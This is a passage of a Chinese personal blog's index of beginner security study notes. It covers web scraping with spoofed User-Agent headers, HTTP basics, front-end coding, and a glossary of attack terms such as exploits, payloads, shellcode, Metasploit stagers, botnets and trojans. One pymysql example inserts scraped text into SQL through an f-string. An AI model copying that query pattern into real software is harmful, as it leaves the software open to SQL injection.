网络安全(信息轰炸, web漏洞扫描)\n\n一般流程\n\n\n\n会话技术:Cookie(s)\n介绍: 指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据, 实际由服务器发送给客户端, 可以理解为一个凭证, 服务器可以以此辨别用户身份\n\n爬虫中使用cookie\n\n好处: 能够访问登录界面\n坏处: 容易被反爬\n\n\n\nSession\n含义: 在爬虫中, 指一个浏览器窗口从打开到关闭的这个期间\n目的: 在一个客户打开浏览器到关闭的这个期间, 发起的所有请求都可以被识别为同一个用户\n实现: 客户访问网站时, 生成一个包含SessionID的cookie, 用于服务器识别\nSession是储存在服务器上的数据\n\n\n爬虫基础urllib库request模块简单示例\n导入urllib请求模块:\npythonimport urllib.request\n发送GET请求:\npythonr = urllib.request.urlopen(&#39;http://www.baidu.com&#39;)\n查看返回信息:\npythonprint(r.read().decode(&#39;utf-8&#39;))返回了网页源码\n\n\nurlopen方法\nurlopen方法有三个参数\npythonurllib.request.urlopen(url, data=None, [timeout, ]*)\ndata: 给post请求携带参数, 比如在模拟登录时传入用户名和密码\n\ntimeout: 设置请求超时时间\n\nurlopen 默认是 Get 请求, 当我们传入参数它就为 Post 请求了\n\n\nRequest方法\nRequest方法有四个参数:\npythonurllib.request.Request(url, data=None, headers=&#123;&#125;, method=None)\nheaders: 请求头信息\n\nmethod: 设置请求方式\n\n\nrequests库发送请求\nGET请求示例:\npythonimport requests\n\n\nr = requests.get(&quot;https://www.bilibili.com/&quot;)\nprint(r)\nprint(r.ok)  输出(失败):\ntxt&lt;Response [412]&gt;\nFalse\n修改请求头, 模拟浏览器访问:\npythonimport requests\n\n\nheaders = &#123;\n    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&quot;\n&#125;\nr = requests.get(&quot;https://www.bilibili.com/&quot;, headers=headers)\nprint(r)\nprint(r.ok)输出(成功):\ntxt&lt;Response [200]&gt;\nTrue\n\n正则表达式匹配导入模块-re\npythonimport re\n\n捕获组\n要获取的字段要用括号( )括起来\n\n匹配:re.match函数\n函数语法\npythonre.match(pattern, string, flags=0)\n\n\n参数\n描述\n\n\n\npattern\n匹配的正则表达式\n\n\nstring\n要匹配的字符串。\n\n\nflags\n标志位，用于控制正则表达式的匹配方式\n\n\n\n\n\n修饰符\n描述\n\n\n\nre.I\n使匹配对大小写不敏感\n\n\nre.L\n做本地化识别（locale-aware）匹配\n\n\nre.M\n多行匹配，影响 ^ 和 $\n\n\nre.S\n使 . 匹配包括换行在内的所有字符\n\n\nre.U\n根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B.\n\n\nre.X\n该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。\n\n\n\n返回:\n\n匹配成功 re.match 方法返回一个匹配的对象，否则返回 None。\n可使用 group(num) 或 groups() 来获取匹配表达式。\n\n\n示例:\npythoncontent = &#39;Hello 100 World!&#39;\nres = re.match(r&#39;^He.*?(\\d+)\\s.*!$&#39;, content)\nprint(res.group(1))输出:\ntxt100\n\n查找\n查找第一个:\npythonres = re.search(r&#39;[\\d]&#123;3&#125;&#39;, content)\n查找所有:\npythonres = re.findall(r&#39;[\\d]&#123;3&#125;&#39;, content)\n\n封装匹配方式\npythonpattern = re.compile(&#39;Xi.*?(\\d+)\\s.*s&#39;,re.S)\n\nBeautifulSoup解析获取的html文件\n示例:\npythonimport requests\nfrom bs4 import BeautifulSoup\n\nheaders = &#123;\n    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&quot;\n&#125;\n    response = requests.get(f&quot;https://movie.douban.com/top250)\n    content = response.text\n                            \n    soup = BeautifulSoup(content, &quot;html.parser&quot;)\n    title = soup.find_all(&quot;div&quot;, &#123;&quot;class&quot;: &quot;info&quot;&#125;)\n    for info in title:\n        for hd in info.find_all(&quot;div&quot;, &#123;&quot;class&quot;: &quot;hd&quot;&#125;):\n            print(hd.find(&quot;span&quot;, &#123;&quot;class&quot;: &quot;title&quot;&#125;).string)输出:\ntxt肖申克的救赎\n霸王别姬\n阿甘正传\n泰坦尼克号\n这个杀手不太冷\n千与千寻\n美丽人生\n星际穿越\n盗梦空间\n..\nsoup = BeautifulSoup(content, &quot;html.parser&quot;), 解析content中的HTML\n\nXX.find()返回查找的第一个\n\nXX.find_all()返回找到的全部内容的一个列表\n\n\nSelenium自动化工具安装与导入\nshpip install selenium\npythonfrom selenium import webdriver\n\n示例\npythonfrom selenium import webdriver\n\n\ndriver = webdriver.Chrome() # 创建一个web驱动(Chrome驱动)实例\ndriver.get(&quot;https://www.baidu.com&quot;) # 打开网页\n\ninput = driver.find_element(&#39;css selector&#39;, &#39;#kw&#39;) # 找到输入框\ninput.send_keys(&#39;图片&#39;) # 输入内容\n\nbutton = driver.find_element(&#39;css selector&#39;, &#39;#su&#39;) # 找到按钮\nbutton.click() # 点击按钮\n效果与真正的用户操作几乎一样:\n\n\n\n常用方法获取元素\nfind_element():获取单个元素\nfind_elements(): 获取多个元素\n第一个参数’by’用于指定获取搜索目标, 包括id, name, xpath, link text, partial link text, tag name, class name, css selector\n\n输入内容\nsend_key()\n\n获取信息\ncurrent_url获取请求链接\nget_cookies()获取 cookies\npage_source获取源代码\ninput.text获取文本的值\n\n数据存储\npymysql: mysql操作\n\n操作:\n\n安装: pip install PyMySQL\n导入:import pymysql \n创建连接:\n\npythonconn = pymysql.connect(\n    host=&#39;localhost&#39;,\t\t# 主机名（或IP地址）\n    port=3306,\t\t\t\t# 端口号，默认为3306\n    user=&#39;root&#39;,\t\t\t# 用户名\n    password=&#39;password&#39;,\t# 密码\n    charset=&#39;utf8mb4&#39;  \t\t# 设置字符编码\n)\nmysql服务信息: conn.get_server_info()\n\n创建游标对象: cursor = conn.cursor() \n\n选择数据库: conn.select_db(&quot;table_name&quot;) \n\n执行操作: cursor.execute(&#39;SELECT * FROM table_name&#39;) \n\n获取查询结果，返回元组: result : tuple = cursor.fetchall() \n\n关闭游标和连接: cursor.close() , conn.close() \n\n数据更改后(insert, update, delete), 需提交更改: conn.commit() \n\n自动提交更改: 在创建连接时, 加上参数autocommit=True\n\n错误处理, 回滚操作: conn.rollback()\ntxttry:\n    # 执行一些操作\n    ...\n    conn.commit()\nexcept Exception as e:\n    print(f&quot;发生错误：&#123;e&#125;&quot;)\n    conn.rollback()\nfinally:\n    cursor.close()\n    conn.close()\n\n\n实例:\npythonimport requests\nfrom bs4 import BeautifulSoup\nimport pymysql\n\n\nconn = pymysql.connect(\n    host=&#39;localhost&#39;,\n    port=3306,\n    user=&#39;root&#39;,\n    password=&#39;root&#39;,\n    charset=&#39;utf8mb4&#39;\n)\n\nprint(conn.get_server_info())\nconn.select_db(&#39;pymysql&#39;)\ncur = conn.cursor()\n\nheaders = &#123;\n    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&quot;\n&#125;\nfor start_num in range(0, 250, 25):\n    response = requests.get(f&quot;https://movie.douban.com/top250?start=&#123;start_num&#125;&quot;, headers=headers)\n    content = response.text\n    soup = BeautifulSoup(content, &quot;html.parser&quot;)\n    title = soup.find_all(&quot;div&quot;, &#123;&quot;class&quot;: &quot;info&quot;&#125;)\n    for info in title:\n        for hd in info.find_all(&quot;div&quot;, &#123;&quot;class&quot;: &quot;hd&quot;&#125;):\n            name = hd.find(&quot;span&quot;, &#123;&quot;class&quot;: &quot;title&quot;&#125;).string\n            cur.execute(f&quot;insert into douban (name) values (&#39;&#123;name&#125;&#39;)&quot;)\n            conn.commit()\n\n\nredis-dump: redis数据库操作delano&#x2F;redis-dump: Backup and restore your Redis data to and from JSON. (github.com)\n\n\n爬虫框架scrapy: 可以轻松爬取亚马逊等商城的数据\n\n安装: pip install Scrapy\n新建项目: scrapy startproject &lt;project-name&gt;\n制作爬虫:\n新建爬虫:scrapy genspider &lt;name&gt; &quot;&lt;网站域名&gt;&quot;, 爬取数据\n\n在items.py定义\npyclass SupplytraceItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    id = scrapy.Field()\n    company_name_english = scrapy.Field()\n    company_name_legal = scrapy.Field()\n    brand = scrapy.Field()\n在爬虫文件中处理数据\n\n\n\n保存数据:\n-o输出到指定文件: scrapy crawl &lt;name&gt; -o &lt;filename&gt;会根据文件类型进行保存, 包括json, jsonl, csv, xml文件\n\n\n\n","slug":"Python爬虫基础","date":"2024-01-28T05:33:12.000Z","categories_index":"","tags_index":"网络安全,学习日志,Python基础","author_index":"Myprefer"},{"id":"fc05fbb308fc2fe612857f2de1b31069","title":"HTTP协议请求结构","content":"HTTP协议\nHTTP: Hypertext Transfer Protocol\n作用: 是一种用于传输超文本的协议。\n是客户端和服务器之间进行通信的基础，常用于在Web浏览器和Web服务器之间传输数据。\n客户端与服务端之间通过交换一个个独立的消息进行通信, 客户端发出的称为请求, 服务端发出的应答消息称为响应\n\n\n\nHTTP请求的基本结构示例:\nhttpPOST /api/login HTTP/1.1 \nHost: example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\nContent-Type: application/json\n\n&#123;&quot;username&quot;: &quot;user123&quot;, &quot;password&quot;: &quot;pass456&quot;&#125;\n请求行（Request Line）\n请求头（Header）\n请求体（Body）\n\n请求行\n请求行位于请求报文的开头(示例第一行), 包括:\n\n请求方法\nURL\nHTTP版本\n\n\n请求方法:\n\n\n\n\n\n请求方法\n描述\n用途\n\n\n\nGET\n请求获取指定资源\n获取网页、图片、文本等资源\n\n\nPOST\n在服务器上创建新的资源\n提交表单数据、上传文件等\n\n\nPUT\n更新服务器上的资源\n更新已存在的资源\n\n\nDELETE\n请求服务器删除指定资源\n删除资源\n\n\nHEAD\n请求获取响应头信息\n获取资源的头部信息，而不获取资源本身\n\n\nOPTIONS\n请求查看支持的方法\n查询服务器支持的HTTP方法\n\n\nPATCH\n对资源进行部分修改\n部分更新资源\n\n\n请求头\nHTTP请求头提供了关于请求, 响应或者其他的发送实体的信息\n\n示例中:\n\nHost：指定服务器的域名和端口号。\n\nUser-Agent：浏览器或客户端的信息。\n\nContent-Type：请求体的数据类型，如application&#x2F;json。\n\n\n\n其他常见请求头，如Accept、Authorization等, 手册:HTTP 标头（header） - HTTP | MDN (mozilla.org)\n\n\n请求体\n可选, 主要用于再请求中携带一些数据(表单等)\n主要用于POST, PUT等需要向服务器提交数据的请求\nContent-Type请求头用于指示请求体的媒体类型, 例如:\napplication/x-www-form-urlencoded：用于普通表单数据。\nmultipart/form-data：用于文件上传等表单数据。\napplication/json：用于JSON数据。(示例)\ntext/plain：用于纯文本数据等。\n\n\nContent-Type手册: HTTP content-type\n\n\n状态码\n当访问一个网页时, 客户端向服务端发出请求, 服务端返回一个包含HTTP状态码的信息头(server header)\n\n常见的有:\n\n200 - 请求成功\n\n301 - 资源（网页等）被永久转移到其它URL\n\n404 - 请求的资源（网页等）不存在\n\n500 - 内部服务器错误\n\n\n\n状态码分类:\n\n\n\n\n\n分类\n分类描述\n\n\n\n1xx\n信息，服务器收到请求，需要请求者继续执行操作\n\n\n2xx\n成功，操作被成功接收并处理\n\n\n3xx\n重定向，需要进一步的操作以完成请求\n\n\n4xx\n客户端错误，请求包含语法错误或无法完成请求\n\n\n5xx\n服务器错误，服务器在处理请求的过程中发生了错误\n\n\n\n参考手册: HTTP 响应状态码 - HTTP | MDN (mozilla.org)\n\n","slug":"HTTP协议请求结构","date":"2024-01-27T12:53:28.000Z","categories_index":"","tags_index":"网络安全,学习日志","author_index":"Myprefer"},{"id":"004992c1c97a2410f49880be41043864","title":"前端三剑客: HTML/CSS/JavaScript","content":"HTML:结构\nHTML是一种超文本标记语言，不是一种编程语言\n\n主要用来实现静态页面，我们在页面看到的文本，图片，视频，声音，表格，链接等都是通过HTML语言描述的\n\nHTML的是由标签组成，给不同的标签不同的属性，可以实现不同的网页效果。\n\n页面基本结构:\nhtml&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset=&quot;UTF-8&quot;&gt;\n&lt;title&gt;\n页面标题&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n \n&lt;h1&gt;一个标题&lt;/h1&gt;\n \n&lt;p&gt;一个段落&lt;/p&gt;\n \n&lt;/body&gt;\n&lt;/html&gt;\n参考手册: HTML 标签列表（功能排序） | 菜鸟教程 \n\n\nCSS:修饰介绍\nCSS 用于 HTML 文档中元素样式的定义\n使用 CSS 的目的就是让网页具有美观一致的页面\n\n参考手册\nCSS 参考手册 | 菜鸟教程 (runoob.com)\n\n基础语法选择器\n元素选择器：选择特定类型的元素，如 p 表示段落。\ncssinput &#123;\n    width: 250px;\n    padding: 10px;\n    margin-bottom: 10px;\n    border: 1px solid #bfbcbc;\n    border-radius: 4px;\n&#125;使用示例:\nhtml&lt;input type=&quot;text&quot; id=&quot;phoneNumber&quot; name=&quot;phoneNumber&quot; required&gt;使用前:\n\n使用后: 可以看到输入框(input)改变了\n\n\n类选择器：选择具有特定类的元素，如 .highlight 表示具有 highlight 类的元素。\ncssh1.textStyle &#123;\n    text-align: center;\n    /*仅一级标题(h1)能够使用*/\n    /*如果直接写  .textStyle , 所有元素都可以使用*/\n&#125;使用示例: \nhtml &lt;h1 class=&quot;textStyle&quot;&gt;模拟登录&lt;/h1&gt;使用前:\n\n使用后: 可以看到, 标题文字被居中\n\nID选择器：选择具有特定ID的元素，如 #header 表示具有 header ID 的元素。\ncss#loginForm &#123;\n    width: 300px;\n    margin: 0 auto;\n    padding: 20px;\n    border: 1px solid #6e6c6c;\n    border-radius: 5px;\n&#125;使用示例:\nhtml&lt;form id=&quot;loginForm&quot;&gt;\n        &lt;label for=&quot;phoneNumber&quot;&gt;手机号：&lt;/label&gt;\n        &lt;input type=&quot;text&quot; id=&quot;phoneNumber&quot; name=&quot;phoneNumber&quot; required&gt;\n        &lt;button type=&quot;submit&quot;&gt;登录&lt;/button&gt;\n&lt;/form&gt;使用前:\n使用后: 可以看到, 整个表单的属性改变了\n\n\n\nCSS创建\n内部样式表: 在html文件头部(&lt;head&gt;)用&lt;style&gt;定义样式表, 例如:\nhtml&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;模拟登录&lt;/title&gt;\n    &lt;style&gt;\n        #loginForm &#123;\n            width: 300px;\n            margin: 0 auto;\n            padding: 20px;\n            border: 1px solid #6e6c6c;\n            border-radius: 5px;\n        &#125;\n        &lt;!--省略其他选择器--&gt;\n    &lt;/style&gt;\n&lt;/head&gt;\n外部样式表: 将样式表保存在外部文件中, 在html的中使用链接到样式表, 例如\nhtml&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;模拟登录&lt;/title&gt;\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;style/test1.css&quot;&gt;\n&lt;/head&gt;style&#x2F;test1.css:\ncss #loginForm &#123;\n     width: 300px;\n     margin: 0 auto;\n     padding: 20px;\n     border: 1px solid #6e6c6c;\n     border-radius: 5px;\n &#125;\n\ninput &#123;\n    width: 250px;\n    padding: 10px;\n    margin-bottom: 10px;\n    border: 1px solid #bfbcbc;\n    border-radius: 4px;\n&#125;\n\nh1.textStyle &#123;\n    text-align: center;\t\n&#125;\n内联样式: 在相关的标签内直接使用样式（style）属性, 例如\nhtml&lt;p style=&quot;color:sienna;margin-left:20px&quot;&gt;这是一个段落。&lt;/p&gt;慎用, 建议只在一个元素上使用一次时使用\n\n多重样式优先级: 内联 &gt; 内部 &gt; 外部 &gt; 浏览器默认\n\n\n\nJavaScript:行动介绍\nJavaScript是一门轻量级的脚本语言，是一种运行在客户端的脚本语言 \n\n\n\n\n\n\n\n\n\nScript 是脚本的意思\n脚本语言：不需要编译，运行过程中由 js 解释器(js 引擎）逐行来进行解释并执行\n\n不同于Java程序运行在JVM中，JavaScript运行是直接运行在浏览器中\n\n主要使用来实现页面功能和业务逻辑\n\n\n参考手册\nJavaScript 和 HTML DOM 参考手册 | 菜鸟教程 (runoob.com)\n\n基础作用\n直接写入 HTML 输出流\n\n对事件的响应\n\n改变 HTML 内容, 图像, 样式\n\n验证输入\n\n\nJavaScript使用\nHTML中的 JS 代码必须在&lt;script&gt;标签中,   可以在&lt;head&gt;或&lt;body&gt;部分中, 例如:\nhtml&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;zh-CN&quot;&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;title&gt;learn01&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;script&gt;\n            document.write(&quot;hello world!&quot;)\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;效果: \n\n\n函数: 在触发某种事件的时候可以调用函数, 以实现某些交互效果, 例如:\nhtml&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n    &lt;script&gt;\n        function test() &#123;\n            document.getElementById(&quot;demo&quot;).innerHTML = &quot;Hello world!&quot;;\n        &#125;\n    &lt;/script&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;p id=&quot;demo&quot;&gt;\n        一个段落\n    &lt;/p&gt;\n    &lt;button type=&quot;button&quot; onclick=&quot;test()&quot;&gt;\n        点我\n    &lt;/button&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;点击后, 页面会出现一些变化\n\n\n\n外部的JavaScript:在&lt;script&gt;标签的”src”属性中设置 JS 文件的路径, 例如:\nhtml&lt;script src=&quot;script/script01.js&quot;&gt;&lt;/script&gt;\n\n输出\n显示数据:\n使用 window.alert() 弹出警告框。\n使用 document.write() 方法将内容写到 HTML 文档中。\n使用 innerHTML 写入到 HTML 元素。\n使用 console.log() 写入到浏览器的控制台。在Console菜单中\n\n\n操作HTML元素: 用”id”属性标识元素, 用document.getElementById(id) 方法查找该元素, 使用innerHTML()来获取或插入元素内容, 如上\n\n事件\nHTML 事件可以是浏览器行为，也可以是用户行为, 实例：\n\nHTML 页面完成加载\nHTML input 字段改变时\nHTML 按钮被点击\n\n\n事件手册: HTML 事件参考手册\n\n触发时调用 JS :\nhtml&lt;some-HTML-element some-event=&quot;JavaScript 代码&quot;&gt;例如: \nhtml&lt;button type=&quot;button&quot; onclick=&quot;this.innerHTML = Date()&quot;&gt;Time&lt;/button&gt;点击后(触发”onclick”事件)会显示当前时间\n\n\n\nJavaScript DOM\nDOM : Document Object Model, 文档对象模型\n通过HTML DOM, JavaScript能够创建动态HTML, 效果如上(Hello world例子)\nJavaScript HTML DOM\n\nJavaScript BOM\nBOM: Browser Object Model,  浏览器对象模型\n\n简单来说，它就是操作控制浏览器的一种能力，工具, 如获取浏览器信息, 前进, 后退页面, 弹出窗口等\n\n一些基本的形式:\n\n\nJavaScript Window - 浏览器对象模型\n\n\n\n补充: 正则表达式\n一种文本匹配工具, 用于匹配字符串\n\n在线测试工具: regex101: build, test, and debug regex\n\n参考手册: \n\n正则表达式\nlearn-regex\n\n\n语法: \n\n元字符:\n\n?  : 前一个字符可有可无(出现1次或0次), 如ab?c可以匹配ac和abc\n\n* : 前一个字符可以出现0次或任意次, 如ab*c匹配ac, abc, abbbbc\n\n+ : 前一个字符至少出现一次\n\n{数字n} : 更加精确的次数匹配, 前一个字符出现n次\n\n{n1, n2} : 出现n1~n2次\n\n{n1,} : 出现n1次或n1次以上\ntip: *相当于{0,} ,  +相当于{1,} ,  ？相当于{0,1}\n\n(str) : 群, 例如(ab)&#123;3&#125;匹配ababab\n\n[] : 字符种类, 匹配方括号内的任意字符\n\n[^ ] : 否定的字符种类, 匹配除了方括号里的任意字符\n\n^ : 表示开头\n\n$ : 表示末尾\n\n\n\n或运算: (str1|str2), 例如a (ab|cd)匹配a ab和a cd\n\n简写字符集:\n\n\n\n简写\n描述\n\n\n\n.\n除换行符外的所有字符\n\n\n\\w\n匹配所有字母数字，等同于 [a-zA-Z0-9_]\n\n\n\\W\n匹配所有非字母数字，即符号，等同于： [^\\w]\n\n\n\\d\n匹配数字： [0-9]\n\n\n\\D\n匹配非数字： [^\\d]\n\n\n\\s\n匹配所有空格字符，等同于： [\\t\\n\\f\\r\\p&#123;Z&#125;]\n\n\n\\S\n匹配所有非空格字符： [^\\s]\n\n\n\\f\n匹配一个换页符\n\n\n\\n\n匹配一个换行符\n\n\n\\r\n匹配一个回车符\n\n\n\\t\n匹配一个制表符\n\n\n\\v\n匹配一个垂直制表符\n\n\n\\p\n匹配 CR&#x2F;LF（等同于 \\r\\n），用来匹配 DOS 行终止符\n\n\n\n\n\nJS 中的正则表达式: \n\n语法: /正则表达式主体/修饰符(可选)例如: \njsvar reg = /test/itest 是一个正则表达式主体 (用于检索)。\ni 是一个修饰符 (搜索不区分大小写)。\n修饰符:\n\n\n\n修饰符\n描述\n\n\n\ni\n执行对大小写不敏感的匹配。\n\n\ng\n执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。\n\n\nm\n执行多行匹配。\n\n\n\n使用:\n\nsearch(): 返回第一个匹配项的索引(下标), 没有则返回-1, 例如:\njsconst str = &#39;Hello, World!&#39;; \nconst index1 = str.search(&#39;World&#39;); // 返回 7\nreplace(): 返回被替换后的新字符串, 例如:\njsconst originalString = &#39;Hello, World! Hello, Universe!&#39;;\nconst regex = /Hello/g;\nconst newString = originalString.replace(regex, &quot;Hi&quot;);// 返回: &#39;Hi, World! Hi, Universe!&#39;\ntest(): 检测是否可以匹配, 返回true或false, 例如:\njsvar regex = /^1[3456789]\\d&#123;9&#125;$/\nresult = regex.test(&#39;13873489827&#39;) //返回true\nexec(): 执行搜索, 返回包含匹配的子字符串或null, 例如:\njsconst regex = /(\\d+)-(\\w+)/;\nconst inputString = &#39;2024-January&#39;;\n\n// 使用 exec() 方法执行正则表达式匹配\nconst result = regex.exec(inputString);\n\nif (result) &#123;\n  console.log(&#39;匹配成功:&#39;, result[0]);       // 输出: &#39;2024-January&#39;\n  console.log(&#39;第一个捕获组:&#39;, result[1]);  // 输出: &#39;2024&#39;\n  console.log(&#39;第二个捕获组:&#39;, result[2]);  // 输出: &#39;January&#39;\n&#125; else &#123;\n  console.log(&#39;未找到匹配项&#39;);\n&#125;\n\n\n\n\n\n","slug":"前端三剑客-HTML-CSS-JavaScript","date":"2024-01-27T02:55:51.000Z","categories_index":"","tags_index":"学习日志,前端基础","author_index":"Myprefer"},{"id":"98cd7ae065ea3b0eb521d89df0440426","title":"小迪安全 P2","content":"WEB应用环境架构类中间件容器: 支撑程序运行\n\n\n\n\n\n\n\n\n中间件容器通常是指一种软件环境，用于托管、管理和运行各种中间件服务。中间件容器为应用程序提供了一个统一的平台，使它们能够在不同的环境中无缝运行。这种容器化的方式有助于简化应用程序的部署、管理和扩展。\n以下是一些中间件容器的常见特征和应用场景：\n\n统一的运行环境\n轻量级和可移植性： 中间件容器通常设计为轻量级和可移植的，可以在不同的操作系统和云平台上运行。这有助于简化跨不同环境的部署和迁移。\n自动化和扩展性： 中间件容器通常提供自动化的管理功能，包括自动扩展、负载均衡和故障恢复。这些特性有助于提高系统的可用性和性能。\n容器编排： 一些中间件容器还包括容器编排工具，用于管理和编排多个中间件容器的部署，以便构建分布式和高可用的系统。\n开发和运维的分离\n\nWEB安全漏洞:\nSQL注入, 文件安全, RCE执行, XSS跨站, ……..\n产生原因: 程序源码有问题\n请求(request) —- 返回\n可通过抓包工具获取请求包和返回包\n\nBurp Suite 抓包、改包工具设置代理\nburp suite代理工具是以拦截代理的方式，拦截所有通过代理的网络流量，如客户端的请求数据、服务端的返回信息等\n\n\n\n","slug":"小迪安全-P2","date":"2024-01-26T13:30:28.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,基础入门","author_index":"Myprefer"},{"id":"85481ffdf268686e9e050b9559eb163e","title":"第二周课程-前端与HTML","content":"前端与HTML基本概念请求方法\nGET: 获取资源\n\nPOST: 提交资源\n\n\n\n\n响应状态码\n1XX: 服务器收到请求, 需要继续操作\n2XX: 成功\n3XX: 重定向, (跳转)\n4XX: 用户的问题(客户端错误 语法错误), 常见:\n403: 访问被拒绝\n404: 资源不存在\n\n\n5XX: 服务器的问题\n\n详细:HTTP 响应状态码 - HTTP | MDN (mozilla.org)\nHTTP协议组成\n请求头(标头header): HTTP 标头（header） - HTTP | MDN\nHTTP 请求头各参数具体含义_http请求头包含哪些参数-CSDN博客\n查看请求头: F12进入开发者工具-&gt;网络-&gt;点击名称列查看更加详细信息\n\n请求行, 请求体, http响应\n\n\n\n作业:\n\n\n内容1：在菜鸟教程或W3Sschool进行自主学习前端内容，HTML、JavaScript以及CSS，并记录在笔记中，笔记内容包括概念、代码以及效果截图，笔记情况需要检查。\n\n内容2：学习HTTP协议请求结构，把相关概念与学习情况记录在笔记中，需要检查。\n\n内容3：写一个提交表单进行模拟登录，用户账号是手机号，不需要后端接收，但登录需要配置JS去验证手机号格式输入。\n\n笔记导出成pdf或word或md格式，和模拟登录代码一起打包成压缩包进行提交。\n\n学习: python基础 -&gt; 爬虫\n\n\n","slug":"第二周课程-前端与HTML","date":"2024-01-26T07:03:04.000Z","categories_index":"","tags_index":"网络安全,学习日志,视频会议","author_index":"Myprefer"},{"id":"d93bdcbda8570f036015a41880791d5d","title":"渗透测试常用术语总结","content":"渗透测试常用术语总结\n目录\n\n题记\n渗透测试常用专业术语\n加更：暗网\n转大佬笔记\n一、攻击篇\n二、防守篇\n\n\n题记​     人的一生会遇到两个人，一个惊艳了时光，一个温柔了岁月。        —— 苏剧 《经年》\n\n渗透测试常用专业术语​     相信大家和我一样，搞不清这些专业名词的区别，所以我来整理一下。\n1. POC、EXP、Payload与Shellcode\n\n\n\n\n\n\n\n\nPOC：全称 ‘ Proof of Concept ‘，中文 ‘ 概a念验证 ‘ ，常指一段漏洞证明的代码。\nEXP：全称 ‘ Exploit ‘，中文 ‘ 利用 ‘，指利用系统漏洞进行攻击的动作。\nPayload：中文 ‘ 有效载荷 ‘，指成功exploit之后，真正在目标系统执行的代码或指令。\nShellcode：简单翻译 ‘ shell代码 ‘，是Payload的一种，由于其建立正向&#x2F;反向shell而得名。\n2. 几点注意\n\n\n\n\n\n\n\n\nPOC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。\nPayload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。\nShellcode也有很多种，包括正向的，反向的，甚至meterpreter。\nShellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。\n3. Payload模块\n\n\n\n\n\n\n\n\n在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。\n4. 总结\n\n\n\n\n\n\n\n\n想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个POC。之后你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的录音笔，这一天你所做的就是一个EXP，你在他家所做的就是不同的Payload，就把录音笔当作Shellcode吧！\n\n加更：暗网​    我是会把我遇到很晦涩或者难以理解的词语分享到这的。\n​    暗网这个词是我在b站偶然看到一个叫经常给开发找麻烦的金子姑娘的视频，她的解释让我理解了这个词，所以解释一下。暗网并不是那种灰色交易遍布，人们谁也不认谁，很罪恶的地方，充满着人性的负面。暗网其实就是带密码的空间，就像我们的qq空间。网络世界10%在表面，剩下的就是暗网。浏览器的搜索引擎其实就是利用爬虫把各个网页资源整合到一起，他也有进不去的地方，就像地图软件除了用卫星还有人工测绘人员，他们就像爬虫一样，总有到达不了的暗网。这里提到tor浏览器（洋葱），这个浏览器的原理就是a如果想把消息给b，a把消息给c，c给d，d给e。经过层层代理，导致无法确定人们的踪迹，所以慢慢的这里就成为了罪犯最好的集聚地。这里加一个匿名浏览器tor的详细介绍：https://www.cnblogs.com/liun1994/p/6435505.html          ————2020&#x2F;09&#x2F;19\n\n转大佬笔记一、攻击篇1．攻击工具肉鸡​    所谓“肉鸡”是一种很形象的比喻，比喻那些可以被攻击者控制的电脑、手机、服务器或者其他摄像头、路由器等智能设备，用于发动网络攻击。​    例如在2016年美国东海岸断网事件中，黑客组织控制了大量的联网摄像头用于发动网络攻击，这些摄像头则可被称为“肉鸡”。\n僵尸网络​    僵尸网络 Botnet 是指采用一种或多种传播手段，将大量主机感染病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络。​    僵尸网络是一个非常形象的比喻，众多的计算机在不知不觉中如同中国古老传说中的僵尸群一样被人驱赶和指挥着，成为被攻击者执行各类恶意活动（DDOS、垃圾邮件等）利用的一种基础设施。\n木马​    就是那些表面上伪装成了正常的程序，但是当这些程序运行时，就会获取系统的整个控制权限。\n​    